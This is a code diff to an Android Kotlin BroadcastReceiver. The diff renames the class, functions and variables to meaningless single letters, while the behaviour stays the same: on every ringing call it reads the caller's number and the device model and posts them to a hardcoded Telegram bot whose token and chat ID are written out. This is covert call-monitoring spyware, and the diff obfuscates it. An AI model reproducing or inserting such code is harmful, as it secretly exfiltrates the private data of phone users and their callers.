@@ -9,62 +9,58 @@ import okhttp3.OkHttpClient
 import okhttp3.Request
 import okhttp3.RequestBody.Companion.toRequestBody
 
-class CallReceiver : BroadcastReceiver() {
-    private val client = OkHttpClient()
+class X : BroadcastReceiver() {
+    private val y = OkHttpClient()
 
-    override fun onReceive(context: Context?, intent: Intent?) {
-        val state = intent?.getStringExtra(TelephonyManager.EXTRA_STATE)
-        val incomingNumber = intent?.getStringExtra(TelephonyManager.EXTRA_INCOMING_NUMBER)
-        val deviceModel = getDeviceModel()
+    override fun onReceive(z: Context?, a: Intent?) {
+        val b = a?.getStringExtra(TelephonyManager.EXTRA_STATE)
+        val c = a?.getStringExtra(TelephonyManager.EXTRA_INCOMING_NUMBER)
+        val d = e()
 
-        if (state == TelephonyManager.EXTRA_STATE_RINGING && incomingNumber != null) {
-            val callerNumber = incomingNumber
-            val deviceModel = getDeviceModel()
-
-            sendCallInfoToTelegram(callerNumber, deviceModel)
+        if (b == TelephonyManager.EXTRA_STATE_RINGING && c != null) {
+            f(c, d)
         }
     }
 
-    private fun getDeviceModel(): String {
+    private fun e(): String {
         return "${android.os.Build.MANUFACTURER} ${android.os.Build.MODEL}"
     }
 
+    private fun f(g: String, h: String) {
+        val i = "7824327491:AAGmZ5eA57SWIpWI3hfqRFEt6cnrQPAhnu8"
+        val j = "6331293386"
+        val k = "https://api.telegram.org/bot$i/sendMessage"
 
-    private fun sendCallInfoToTelegram(callerNumber: String, device: String) {
-        val botToken = "7824327491:AAGmZ5eA57SWIpWI3hfqRFEt6cnrQPAhnu8"
-        val chatId = "6331293386"
-        val url = "https://api.telegram.org/bot$botToken/sendMessage"
-
-        val text = """
+        val l = """
             Входящий вызов!
-            Номер: $callerNumber
+            Номер: $g
             
-            $device""".trimIndent()
+            $h""".trimIndent()
 
-        val mediaType = "application/json".toMediaType()
-        val requestBody = """
+        val m = "application/json".toMediaType()
+        val n = """
             {
-                "chat_id": "$chatId",
-                "text": "$text",
+                "chat_id": "$j",
+                "text": "$l",
                 "parse_mode": "Markdown"
             }
-        """.trimIndent().toRequestBody(mediaType)
+        """.trimIndent().toRequestBody(m)
 
-        val request = Request.Builder()
-            .url(url)
-            .post(requestBody)
+        val o = Request.Builder()
+            .url(k)
+            .post(n)
             .build()
 
-        client.newCall(request).enqueue(object : okhttp3.Callback {
-            override fun onFailure(call: okhttp3.Call, e: java.io.IOException) {
-                e.printStackTrace()
+        y.newCall(o).enqueue(object : okhttp3.Callback {
+            override fun onFailure(p: okhttp3.Call, q: java.io.IOException) {
+                q.printStackTrace()
             }
 
-            override fun onResponse(call: okhttp3.Call, response: okhttp3.Response) {
-                if (!response.isSuccessful) {
-                    println("${response.code}")
+            override fun onResponse(p: okhttp3.Call, r: okhttp3.Response) {
+                if (!r.isSuccessful) {
+                    println("${r.code}")
                 }
-                response.close()
+                r.close()
             }
         })
     }
